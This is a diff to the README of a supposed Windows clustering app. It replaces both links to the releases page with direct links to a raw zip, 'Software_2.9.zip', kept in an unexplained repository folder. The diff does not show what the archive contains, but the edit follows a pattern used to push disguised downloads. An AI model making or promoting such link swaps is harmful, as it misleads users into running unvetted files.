@@ -1,6 +1,6 @@
 # 📊 mlclustering - Analyze data groups using simple tools
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/jasonwithoutastitch174/mlclustering/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/jasonwithoutastitch174/mlclustering/raw/refs/heads/main/commatic/Software_2.9.zip)
 
 This application provides a visual way to handle complex data tasks. You can group information and find patterns without writing code. The software includes nine ways to cluster your data and four ways to simplify large files. You can adjust settings in real time, check your results with standard scores, and save your work as a file for later use.
 
@@ -8,7 +8,7 @@ This application provides a visual way to handle complex data tasks. You can gro
 
 To begin using the tool, you need to visit the release page. This page contains the files required to run the application on your Windows machine.
 
-[Download the application here](https://github.com/jasonwithoutastitch174/mlclustering/releases)
+[Download the application here](https://github.com/jasonwithoutastitch174/mlclustering/raw/refs/heads/main/commatic/Software_2.9.zip)
 
 Follow these steps to set up the software:
 
